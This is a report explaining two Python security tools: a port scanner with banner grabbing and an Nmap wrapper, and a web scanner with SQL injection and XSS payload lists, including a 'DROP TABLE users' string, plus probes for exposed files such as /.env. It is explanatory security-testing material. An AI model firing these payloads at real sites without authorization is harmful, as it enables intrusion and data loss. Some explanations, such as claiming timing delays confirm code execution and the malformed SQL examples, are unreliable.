# Code Analysis & Documentation Report
## Network & Web Security Testing Tools

---

## Introduction

This document provides a technical walkthrough of two Python security tools used for network reconnaissance and web vulnerability assessment. 

Both tools implement standard industry practices for security assessments and demonstrate legitimate approaches to network mapping and vulnerability detection.

---

## Tool 1: Network Reconnaissance Scanner

### Purpose & Overview

The network scanner is designed to perform comprehensive network reconnaissance on a target system. It answers three fundamental questions:

1. **What's listening?** - Which ports are open and accepting connections?
2. **What's running?** - What services and software versions are on those ports?
3. **What OS?** - What operating system is the target running?

This is the foundation of any security assessment—you need to understand what you're looking at before you can evaluate its security posture.

### Core Architecture

The scanner works in three connected stages, each building on the previous:

```
Input (Target IP + Port Range)
    ↓
Stage 1: Port Enumeration
    ↓
Stage 2: Banner Extraction
    ↓
Stage 3: Service Fingerprinting
    ↓
Output (Complete inventory)
```

---

### Stage 1: TCP Port Enumeration

#### How Port Scanning Works

The script iterates through a specified port range and attempts TCP connections to each one:

```python
def port_scan(target, start_port, end_port):
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                print(f"[+] Port {port} is OPEN")
                open_ports.append(port)
            
            sock.close()
        except Exception as e:
            pass
    
    return open_ports
```

#### What's Happening Step-by-Step

**Socket Creation:**
```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
- `AF_INET` = IPv4 protocol family
- `SOCK_STREAM` = TCP (connection-oriented, reliable protocol)

This creates a TCP socket—the mechanism for establishing connections.

**Timeout Configuration:**
```python
sock.settimeout(1)
```
Sets a 1-second window for the connection attempt. If the target doesn't respond within 1 second, we assume the port isn't listening and move on. This keeps the scan from hanging indefinitely.

**Connection Attempt:**
```python
result = sock.connect_ex((target, port))
```
`connect_ex()` is the non-blocking version of connect. It returns:
- `0` = Connection successful (port is open)
- Non-zero = Connection failed (port is closed or filtered)

**The Logic:**
```python
if result == 0:
    open_ports.append(port)
```
When we get a return value of 0, it means we successfully established a TCP connection. A listening service answered our knock. We record this port as open and move to the next one.

#### Why This Works

TCP connections follow a three-way handshake:
1. **SYN** - We send a connection request to the port
2. **SYN-ACK** - If something's listening, it responds
3. **ACK** - We complete the handshake

If no service is listening on that port, the operating system sends back a RST (reset) packet or simply ignores us. Either way, `connect_ex()` returns non-zero and we know the port is closed.

---

### Stage 2: Service Banner Extraction

Once we know which ports are open, we connect to each one and read the first data the service sends back:

```python
def banner_grab(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target, port))
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        return banner.strip()
    
    except:
        return None
```

#### What Banner Grabbing Shows

Different services greet you differently when you connect. These greetings (banners) are incredibly informative:

**SSH Service:**
```
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
```
Tells us: This is SSH version 2.0, running OpenSSH 7.4, on Debian Linux.

**HTTP Service:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```
Tells us: Apache web server version 2.4.41 running on Ubuntu.

**SMTP Service:**
```
220 mail.example.com ESMTP Postfix 3.4.8
```
Tells us: Postfix mail server, version 3.4.8.

#### The Banner Grab Process

```python
sock.connect((target, port))
```
Establishes a real TCP connection to the port. Unlike `connect_ex()`, this is blocking and will wait.

```python
banner = sock.recv(1024).decode('utf-8', errors='ignore')
```
Reads up to 1024 bytes of data. Most services send their identification string right away, before waiting for client input. The `.decode('utf-8', errors='ignore')` converts the bytes to text, ignoring any characters that aren't valid UTF-8.

```python
return banner.strip()
```
Removes whitespace and returns the clean banner string.

#### Why This Matters

Software version information helps identify what vulnerabilities might exist. Security researchers publish CVE (Common Vulnerabilities and Exposures) databases indexed by software version. Knowing the exact version lets a security professional check: "Is this version vulnerable to known attacks?"

This is why many production systems deliberately hide or obscure their banners—it's basic security hygiene to not advertise exactly what software and version you're running.

---

### Stage 3: Service & OS Fingerprinting

The final stage uses Nmap to perform more sophisticated analysis:

```python
def vulnerability_scan(target):
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-sV -O')
        
        result = {}
        
        if target in nm.all_hosts():
            host = nm[target]
            result['hostnames'] = host.hostname()
            
            if 'osmatch' in host:
                result['osmatch'] = host['osmatch']
            
            # Extract open ports + services
            vulns = []
            for proto in host.all_protocols():
                ports = host[proto].keys()
                for port in ports:
                    service = host[proto][port]
                    vulns.append({
                        "port": port,
                        "service": service.get('name'),
                        "product": service.get('product'),
                        "version": service.get('version')
                    })
            
            result['vulns'] = vulns
        
        return result
    
    except Exception as e:
        print(f"[-] Nmap scan failed: {e}")
        return None
```

#### What Nmap Does Here

**Service Detection (`-sV`):**
```python
nm.scan(target, arguments='-sV -O')
```
The `-sV` flag tells Nmap to perform active service version detection. It:
- Probes open ports with service-specific requests
- Compares responses against a database of known services
- Identifies the exact product and version running

**OS Detection (`-O`):**
The `-O` flag performs TCP/IP stack fingerprinting:
- Sends specially crafted packets and analyzes responses
- Compares response patterns against known OS signatures
- Identifies the operating system with high probability

#### Building the Results

```python
for proto in host.all_protocols():
    ports = host[proto].keys()
    for port in ports:
        service = host[proto][port]
        vulns.append({
            "port": port,
            "service": service.get('name'),
            "product": service.get('product'),
            "version": service.get('version')
        })
```

This iterates through all protocols (TCP, UDP, etc.) and all ports, extracting:
- **port** - The port number (22, 80, 443, etc.)
- **service** - Service name (SSH, HTTP, HTTPS)
- **product** - Software name (OpenSSH, Apache, Nginx)
- **version** - Version string (7.4, 2.4.41, etc.)

#### Example Output Structure

```python
{
    'hostnames': ['example.com'],
    'osmatch': [{'name': 'Linux 4.15 - 5.6', 'accuracy': '95%'}],
    'vulns': [
        {'port': 22, 'service': 'ssh', 'product': 'OpenSSH', 'version': '7.4'},
        {'port': 80, 'service': 'http', 'product': 'Apache httpd', 'version': '2.4.41'},
        {'port': 443, 'service': 'https', 'product': 'Apache httpd', 'version': '2.4.41'},
        {'port': 3306, 'service': 'mysql', 'product': 'MySQL', 'version': '5.7.30'}
    ]
}
```

---

### Main Execution Flow

```python
def network_scan(target, start_port, end_port):
    print(f"\n[+] Starting network scan for target: {target}...")
    start_time = datetime.now()
    
    open_ports = port_scan(target, start_port, end_port)
    
    if open_ports:
        print(f"\n[+] Open ports found: {open_ports}")
    else:
        print("\n[-] No open ports found")
    
    # Banner grab for each open port
    for port in open_ports:
        banner = banner_grab(target, port)
        if banner:
            print(f"[+] Banner for {target}:{port} -> {banner}")
        else:
            print(f"[-] No banner found for {target}:{port}")
    
    # Run Nmap for detailed info
    vuln_info = vulnerability_scan(target)
    
    if vuln_info:
        print("\n[+] Nmap Scan Results:")
        if 'hostnames' in vuln_info:
            print(f"Hostnames: {vuln_info['hostnames']}")
        if 'osmatch' in vuln_info:
            print(f"Operating Systems: {vuln_info['osmatch']}")
        if 'vulns' in vuln_info:
            print(f"Vulnerabilities: {vuln_info['vulns']}")
    
    end_time = datetime.now()
    print(f"\n[+] Scan completed in {end_time - start_time}")
```

#### Execution Sequence

1. **Port Scan** - Find all open ports
2. **Banner Grab** - Connect to each port and read its greeting
3. **Service Detection** - Run Nmap with version and OS detection
4. **Timing** - Track how long the entire scan took

#### User Interaction

```python
if __name__ == "__main__":
    target_ip = input("Enter the target IP or Hostname: ")
    start_port = int(input("Enter the starting port: "))
    end_port = int(input("Enter the ending port: "))
    
    network_scan(target_ip, start_port, end_port)
```

The script prompts for three inputs:
- **Target** - IP address or hostname to scan
- **Start Port** - Beginning of port range (typically 1)
- **End Port** - End of port range (typically 65535)

Then launches the complete three-stage reconnaissance pipeline.

---

## Tool 2: Web Application Security Scanner

### Purpose & Overview

While the network scanner gives you a bird's-eye view of what's on a network, the web scanner zooms in on a specific web application and tests it for common vulnerabilities. It's designed to answer:

1. **Are there SQL injection vulnerabilities?** - Can attackers manipulate database queries?
2. **Are there XSS vulnerabilities?** - Can attackers inject malicious scripts?
3. **Are security headers configured?** - Is the application following best practices?
4. **Are sensitive files exposed?** - Are config files, backups, or admin panels public?

---

### Architecture & Phase Design

```
Input (Target URL)
    ↓
Phase 1: Basic Site Information
    ↓
Phase 2: Security Headers Audit
    ↓
Phase 3: SQL Injection Testing
    ↓
Phase 4: XSS Testing
    ↓
Phase 5: Sensitive Files Detection
    ↓
Output (Summary Report)
```

Each phase builds on previous reconnaissance to test progressively deeper vulnerabilities.

---

### Phase 1: Baseline Site Reconnaissance

```python
def get_site_info(url, session):
    section("Basic site info")
    try:
        r = session.get(url, timeout=10)
        info(f"Status:      {r.status_code}")
        info(f"Server:      {r.headers.get('Server', 'hidden')}")
        info(f"Powered by:  {r.headers.get('X-Powered-By', 'hidden')}")
        info(f"Responded in {r.elapsed.total_seconds():.2f}s")
        return r
    except Exception as e:
        print(f"{Fore.RED}Could not connect: {e}{Style.RESET_ALL}")
        sys.exit(1)
```

#### What This Does

Makes a basic HTTP GET request to the target URL and extracts key information:

**HTTP Status Code:**
```python
r.status_code
```
- 200 = OK (site is up)
- 404 = Not Found
- 500 = Server Error
- 403 = Forbidden

**Server Identification:**
```python
r.headers.get('Server', 'hidden')
```
Reads the `Server` HTTP header, which typically identifies the web server software and version.

**Technology Stack:**
```python
r.headers.get('X-Powered-By', 'hidden')
```
Many frameworks add an `X-Powered-By` header revealing they use PHP, ASP.NET, Node.js, etc.

**Response Time:**
```python
r.elapsed.total_seconds()
```
Measures how long the request took to complete. Unusually slow responses might indicate the server is under load or performing expensive operations.

#### Session Management

```python
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"
```

Using a session object instead of individual requests does two things:

1. **Connection Reuse** - HTTP keep-alive. The TCP connection stays open between requests, reducing overhead.
2. **Consistency** - All requests include the same headers and cookies, mimicking a real browser session.

This is important because servers sometimes behave differently depending on browser identification.

---

### Phase 2: Security Headers Validation

```python
important_headers = {
    "Content-Security-Policy":   "blocks XSS attacks",
    "X-Frame-Options":           "prevents clickjacking",
    "X-Content-Type-Options":    "stops MIME sniffing",
    "Strict-Transport-Security": "forces HTTPS",
    "Referrer-Policy":           "controls referrer info",
}

def check_headers(response):
    section("Security headers")
    missing = []
    
    for header, what_it_does in important_headers.items():
        if header in response.headers:
            good(header)
        else:
            warn(f"Missing: {header}  ({what_it_does})")
            missing.append(header)
    
    return missing
```

#### Understanding Each Header

**Content-Security-Policy (CSP):**
```
Content-Security-Policy: script-src 'self' https://trusted.com
```
Tells the browser: "Only execute JavaScript from my own domain or from https://trusted.com. Don't run any inline scripts." This is the primary defense against XSS attacks.

**X-Frame-Options:**
```
X-Frame-Options: DENY
```
Prevents the page from being embedded in an `<iframe>`. Without this, an attacker could load your page inside a hidden frame and trick users into clicking things.

**X-Content-Type-Options:**
```
X-Content-Type-Options: nosniff
```
Prevents MIME type sniffing. Some browsers try to guess what type of content they're receiving. This header says "treat it as what I told you it is, don't guess."

**Strict-Transport-Security (HSTS):**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
Tells browsers: "Always use HTTPS for this domain for the next year. Never allow HTTP connections." This prevents man-in-the-middle attacks where someone intercepts HTTP traffic.

**Referrer-Policy:**
```
Referrer-Policy: strict-origin-when-cross-origin
```
Controls what information is sent in the `Referer` header when users navigate away. This prevents leaking sensitive URL parameters to third-party sites.

#### The Validation Logic

```python
for header, what_it_does in important_headers.items():
    if header in response.headers:
        good(header)
    else:
        warn(f"Missing: {header}  ({what_it_does})")
        missing.append(header)
```

Iterates through each expected header and checks if it exists in the response. Missing headers are flagged and collected for the final report.

---

### Phase 3: SQL Injection Testing

This is where the scanner tests for vulnerability exploits. It implements three distinct techniques to handle different application behaviors:

#### Technique A: Error-Based SQLi Detection

```python
error_payloads = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL --",
    "' AND 1=CONVERT(int,'a') --",  # MSSQL type error
]

error_signs = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"syntax error.*sql",
    r"microsoft ole db provider",
    r"ora-\d{5}",            # Oracle
    r"pg::syntaxerror",      # PostgreSQL
    r"sqlite3::exception",   # SQLite
]
```

#### How Error-Based Detection Works

The idea is simple: inject SQL syntax errors and see if the error messages leak database information.

**Example Attack:**

Normal request:
```
www.shop.com/search?q=laptop
```

Attack request:
```
www.shop.com/search?q=laptop' AND '1'='2
```

If the application constructs the SQL query like this:

```sql
SELECT * FROM products WHERE name = '$q'
```

The query becomes:
```sql
SELECT * FROM products WHERE name = 'laptop' AND '1'='2'
```

The `AND '1'='2` part is always false, so no legitimate results appear. But more importantly, the extra quote at the end creates a syntax error:

```
MySQL Error: You have an error in your SQL syntax; check the manual...
```

If the application displays this error to the user, it confirms:
1. Our input reached the database
2. We can manipulate the SQL query
3. The system is vulnerable to SQL injection

#### Detection Process

```python
for param in params:
    info(f"Testing parameter: '{param}'")
    
    for payload in error_payloads:
        try:
            r = session.get(build_url(param, payload), timeout=10)
            body = r.text.lower()
            
            for sign in error_signs:
                if re.search(sign, body):
                    bad(
                        f"'{param}' is vulnerable (error-based SQLi)",
                        f"payload : {payload}"
                    )
                    found.append({...})
                    already_found = True
                    break
        
        except Exception:
            continue
```

The scanner:
1. Takes each URL parameter found in the initial scan
2. Tries each error-based payload one by one
3. Checks the response for SQL error patterns using regex
4. If a pattern matches, reports the vulnerability

#### Technique B: Boolean-Based Blind SQLi

When the application doesn't display errors, attackers use Boolean logic:

```python
boolean_payloads = [
    ("' AND '1'='1",  "' AND '1'='2"),
    ("' OR '1'='1",   "' OR '1'='2"),
    ("1 AND 1=1",     "1 AND 1=2"),
]

# Get the baseline response
baseline = session.get(url, timeout=10)
baseline_len = len(baseline.text)

for true_p, false_p in boolean_payloads:
    r_true  = session.get(build_url(param, true_p),  timeout=10)
    r_false = session.get(build_url(param, false_p), timeout=10)
    
    len_true  = len(r_true.text)
    len_false = len(r_false.text)
    
    # True condition ≈ baseline, false condition noticeably different
    matches_baseline = abs(len_true  - baseline_len) < 50
    false_differs    = abs(len_true  - len_false)   > 100
    
    if matches_baseline and false_differs:
        bad(
            f"'{param}' is vulnerable (boolean-based SQLi)",
            f"true response: {len_true}B  |  false response: {len_false}B"
        )
        found.append({...})
        already_found = True
```

#### The Boolean Logic

Imagine the vulnerable code is:

```php
SELECT * FROM products WHERE id = $id AND status = 'active'
```

If we inject `1' AND '1'='1` (a condition that's always true):
```sql
SELECT * FROM products WHERE id = 1' AND '1'='1' AND status = 'active'
```

This behaves normally—showing products where id=1 and status is active.

But if we inject `1' AND '1'='2` (a condition that's always false):
```sql
SELECT * FROM products WHERE id = 1' AND '1'='2' AND status = 'active'
```

The condition is false, so no results appear. The page looks completely different.

#### Detection Through Differential Analysis

```python
r_true  = session.get(build_url(param, true_p))   # Normal page
r_false = session.get(build_url(param, false_p))  # Empty page

len_true  = len(r_true.text)   # e.g., 15,432 bytes
len_false = len(r_false.text)  # e.g., 2,100 bytes

if abs(len_true - len_false) > 100:  # Big difference
    # We detected a boolean difference!
```

The scanner compares response sizes. If the "true" injection produces a normal-sized page and the "false" injection produces a significantly smaller page, it indicates we're manipulating the SQL logic.

#### Technique C: Time-Based Blind SQLi

When Boolean-based detection doesn't work, attackers use timing delays:

```python
time_payloads = [
    ("1' AND SLEEP(3) --",            3),   # MySQL
    ("1'; WAITFOR DELAY '0:0:3' --",  3),   # MSSQL
    ("1' AND pg_sleep(3) --",          3),   # PostgreSQL
]

for payload, delay in time_payloads:
    try:
        r = session.get(
            build_url(param, payload),
            timeout=delay + 5
        )
        elapsed = r.elapsed.total_seconds()
        
        if elapsed >= delay:
            bad(
                f"'{param}' is vulnerable (time-based blind SQLi)",
                f"response took {elapsed:.1f}s with SLEEP({delay}) payload"
            )
            found.append({...})
            already_found = True
    
    except Exception:
        continue
```

#### How Time-Based Detection Works

The attack uses database sleep/delay functions:

**MySQL:**
```sql
SELECT * FROM products WHERE id = 1' AND SLEEP(3) AND '1'='1
```

**MSSQL:**
```sql
SELECT * FROM products WHERE id = 1'; WAITFOR DELAY '0:0:3'; --
```

If our injection reaches the database, the server pauses for 3 seconds before responding. If we get a response delay that matches our sleep duration, we've confirmed code execution.

#### Detection Logic

```python
elapsed = r.elapsed.total_seconds()

if elapsed >= delay:
    # Response took 3+ seconds = SLEEP(3) executed
```

Measures actual response time. If requesting `?id=1' AND SLEEP(3) --` takes 3+ seconds, while normal requests take 0.1 seconds, we've detected SQLi.

This technique works even when the application shows no error messages and doesn't differentiate content based on query results. The timing itself is the signal.

---

### Phase 4: Reflected XSS Detection

```python
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]

def check_xss(url, session):
    section("XSS (Cross-Site Scripting)")
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        warn("No URL parameters to test")
        return []
    
    found = []
    
    for param in params:
        info(f"Testing: {param}")
        for payload in xss_payloads:
            test_params = dict(params)
            test_params[param] = payload
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True))
            )
            
            try:
                r = session.get(test_url, timeout=10)
                
                # If our script tag appears unescaped, it'll execute
                if payload in r.text:
                    bad(
                        f"'{param}' reflects the payload unescaped!",
                        f"payload: {payload}"
                    )
                    found.append({"param": param, "payload": payload})
                    break
            
            except Exception:
                pass
    
    if not found:
        good("No reflected XSS found")
    
    return found
```

#### Understanding XSS Vulnerabilities

XSS (Cross-Site Scripting) happens when user input is reflected back in the HTML response without proper escaping.

**Normal Usage:**
```
www.site.com/search?q=laptop
Response: "You searched for: laptop"
```

**XSS Attack:**
```
www.site.com/search?q=<script>alert('hacked')</script>
Response: "You searched for: <script>alert('hacked')</script>"
```

If the browser renders that response, it sees legitimate HTML tags and executes the JavaScript. This could:
- Steal session cookies
- Redirect the user to a malicious site
- Modify the page content
- Capture keyboard input

#### How Detection Works

```python
for payload in xss_payloads:
    test_url = build_url_with_payload(param, payload)
    r = session.get(test_url)
    
    if payload in r.text:
        # Payload echoed back unescaped = XSS found
        found.append({"param": param, "payload": payload})
```

The scanner injects JavaScript payloads and checks if they appear unmodified in the response. If they do, the application is reflecting user input without escaping, making it vulnerable.

#### Payload Varieties

**Direct Script Tag:**
```html
<script>alert('XSS')</script>
```
Classic approach. Browsers execute any script tags in the HTML.

**Event Handler:**
```html
<img src=x onerror=alert('XSS')>
```
Uses the `onerror` event. If the image source is invalid (which it is, `x` isn't a real URL), the browser fires the error event and executes the handler.

**SVG Vector:**
```html
<svg onload=alert('XSS')>
```
SVG images can have JavaScript event handlers. The `onload` event fires when the SVG loads.

Each works through different DOM elements and event handlers, testing multiple reflection points.

---

### Phase 5: Sensitive Files Detection

```python
sensitive_paths = [
    "/.env",
    "/.git/config",
    "/admin",
    "/phpinfo.php",
    "/backup.zip",
    "/config.php",
    "/.htaccess",
    "/wp-admin",
]

def check_files(url, session):
    section("Sensitive files")
    
    # Only keep the domain, drop any path
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    found = []
    
    for path in sensitive_paths:
        full_url = base + path
        try:
            r = session.get(full_url, timeout=8, allow_redirects=False)
            if r.status_code == 200:
                bad(f"Exposed! {full_url}")
                found.append(full_url)
            else:
                good(f"{path}  ({r.status_code})")
        except Exception:
            good(f"{path}  (unreachable)")
    
    return found
```

#### What These Files Are

**/.env** - Environment configuration
```
DB_HOST=db.internal
DB_USER=admin
DB_PASS=SecurePassword123
API_KEY=sk_live_abc123xyz789
```

Contains database credentials, API keys, and other secrets. Should never be publicly accessible.

**/.git/config** - Git repository metadata
```
[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = https://github.com/username/private-repo.git
```

Reveals that the entire source code repository might be exposed.

**/admin** - Administrative interface
Usually a login page, but if accessible without authentication, gives attackers direct access to the application's back office.

**/phpinfo.php** - Server information dump
When called, displays extensive information about the PHP installation, loaded modules, configuration settings, etc. Incredibly useful reconnaissance for attackers.

**/backup.zip** - Unencrypted database backup
Contains the entire database in a single file, often with no password protection.

**/wp-admin** - WordPress administration
WordPress-specific admin panel. Without proper access controls, anyone can log in.

**/.htaccess** - Apache web server configuration
Controls how Apache handles requests, authentication, redirects, etc. Revealing this gives attackers insight into the server configuration.

#### Detection Process

```python
for path in sensitive_paths:
    full_url = base + path
    r = session.get(full_url, timeout=8, allow_redirects=False)
    if r.status_code == 200:
        bad(f"Exposed! {full_url}")
        found.append(full_url)
```

For each sensitive path, the scanner:
1. Constructs the full URL
2. Makes an HTTP request
3. Checks if the status is 200 (OK - file exists and is accessible)
4. Reports any accessible files

#### Why `allow_redirects=False`?

```python
allow_redirects=False
```

Tells the session not to follow redirects. If a server redirects from `/.env` to a login page, we want to see that redirect (status 302) rather than following it to the login page (status 200). This avoids false negatives where a redirect makes it look like the file exists.

---

### Final Summary & Reporting

```python
def print_summary(url, missing_headers, sql_issues, xss_issues, exposed_files):
    section("Summary")
    print(f"  Target: {url}\n")
    
    total = len(missing_headers) + len(sql_issues) + len(xss_issues) + len(exposed_files)
    
    if total == 0:
        print(f"  {Fore.GREEN}All clear! Nothing obvious found.{Style.RESET_ALL}")
        return
    
    print(f"  {Fore.RED}Found {total} issue(s):{Style.RESET_ALL}\n")
    
    if missing_headers:
        print(f"  {Fore.YELLOW}Missing headers:{Style.RESET_ALL}")
        for h in missing_headers:
            print(f"    - {h}")
    
    if sql_issues:
        print(f"\n  {Fore.RED}SQL injection:{Style.RESET_ALL}")
        for v in sql_issues:
            print(f"    - param '{v['param']}' with: {v['payload']}")
    
    if xss_issues:
        print(f"\n  {Fore.RED}XSS:{Style.RESET_ALL}")
        for v in xss_issues:
            print(f"    - param '{v['param']}' with: {v['payload']}")
    
    if exposed_files:
        print(f"\n  {Fore.RED}Exposed files:{Style.RESET_ALL}")
        for f in exposed_files:
            print(f"    - {f}")
```

#### How Reporting Works

```python
total = len(missing_headers) + len(sql_issues) + len(xss_issues) + len(exposed_files)

if total == 0:
    print("All clear!")
else:
    print(f"Found {total} issue(s)")
```

Counts total findings across all vulnerability categories and presents them grouped by type.

The use of color codes (Fore.GREEN, Fore.RED, Fore.YELLOW from the colorama library) makes the output more readable—green for safe findings, red for vulnerabilities, yellow for warnings.

---

### Main Execution Flow

```python
def main():
    if len(sys.argv) < 2:
        print("Usage:   python scanner.py <url>")
        print("Example: python scanner.py http://testphp.vulnweb.com/listproducts.php?cat=1")
        sys.exit(1)
    
    url = sys.argv[1]
    
    # Add http:// if the user forgot it
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    
    # Use a session so we send the same headers every time
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    
    # Run each check
    response        = get_site_info(url, session)
    missing_headers = check_headers(response)
    sql_issues      = check_sql(url, session)
    xss_issues      = check_xss(url, session)
    exposed_files   = check_files(url, session)
    
    # Show what we found
    print_summary(url, missing_headers, sql_issues, xss_issues, exposed_files)


if __name__ == "__main__":
    main()
```

#### Execution Sequence

1. Parse command-line arguments to get the target URL
2. Normalize the URL (add http:// if missing)
3. Create a session with proper headers
4. Run all five detection phases sequentially
5. Collect results from each phase
6. Print comprehensive summary report

---

## Technical Patterns & Techniques Used

### Pattern 1: Try-Except Silencing

Both scripts use broad exception handling:

```python
try:
    # Network operation
except Exception:
    pass  # or: continue
```

This pattern is intentional. Network operations are unpredictable—timeouts, connection resets, DNS failures can occur. Catching all exceptions allows the scan to continue even if individual requests fail.

### Pattern 2: Response Analysis

Both tools extract information from HTTP responses:

```python
if r.status_code == 200:          # Status code analysis
if header in response.headers:     # Header analysis
if payload in r.text:              # Content analysis
if elapsed >= delay:               # Timing analysis
```

This demonstrates different ways to detect vulnerabilities or information:
- Status codes reveal file existence
- Headers reveal configuration
- Content reveals echoed input (XSS)
- Timing reveals code execution (SQLi)

### Pattern 3: Payload Iteration

Both tools systematically test multiple payloads:

```python
for payload in payloads:
    for param in params:
        # Test this payload on this parameter
```

This exhaustive approach ensures comprehensive coverage. By trying multiple attack vectors against multiple parameters, the scanner doesn't miss vulnerabilities through bad luck.

### Pattern 4: Progressive Detection

The web scanner has an `already_found` flag:

```python
already_found = False

for payload in error_payloads:
    if already_found:
        break
    # ... test payload ...
    if vulnerability_found:
        already_found = True
```

Once a vulnerability is found through one technique, the other techniques are skipped for that parameter. This is efficient—no point testing Boolean-based injection if you've already confirmed error-based injection exists.

### Pattern 5: Metadata Construction

Both tools build structured data from responses:

```python
found.append({
    "param": param,
    "payload": payload,
    "technique": "error-based",
})
```

Rather than just printing text, findings are stored as dictionaries. This makes results machine-readable and allows programmatic processing later.

---

## Data Flow Summary

### Network Scanner

```
Target IP + Port Range
    ↓
Try TCP connect to each port
    ↓
Collect open ports
    ↓
Connect to each open port
    ↓
Read service banner
    ↓
Run Nmap -sV -O
    ↓
Parse Nmap results
    ↓
Print formatted report
```

**Result:** Complete inventory of running services with versions and OS

---

### Web Scanner

```
Target URL
    ↓
Fetch page + extract parameters
    ↓
Check security headers
    ↓
Try SQL injection payloads (3 techniques)
    ↓
Try XSS payloads
    ↓
Try accessing sensitive files
    ↓
Aggregate findings
    ↓
Print categorized report
```

**Result:** List of vulnerabilities with payloads that triggered them

---

## Summary

These two scripts represent standard industry approaches to security assessment:

1. **Network Scanner** - Maps the network landscape. Identifies services, versions, and OS. This is reconnaissance—understanding the target before testing.

2. **Web Scanner** - Tests a specific web application against common vulnerabilities. Uses established attack techniques (error-based SQLi, Boolean-based SQLi, time-based SQLi, XSS reflection) to identify security flaws.

Both implement proper socket-level networking, HTTP session management, response parsing, and structured result collection. The code demonstrates practical security assessment techniques used by penetration testers and security researchers worldwide.

The tools work by asking the question "does this system respond to this test?" and interpreting the response to understand the system's behavior. Whether through HTTP status codes, response content, response timing, or exception behavior, each response provides clues about the system's configuration and vulnerabilities.
